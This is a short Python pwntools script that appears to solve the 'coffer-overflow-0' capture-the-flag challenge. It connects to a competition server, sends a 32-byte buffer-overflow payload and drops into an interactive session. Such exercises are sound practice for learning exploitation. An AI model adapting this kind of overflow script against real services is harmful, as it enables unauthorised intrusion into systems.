from pwn import *

#p = process("./coffer-overflow-0")
p=remote("2020.redpwnc.tf",31199)
pause()
offset = 24

payload = 'A'*offset
payload += 'B'*8

p.sendline(payload)
p.interactive()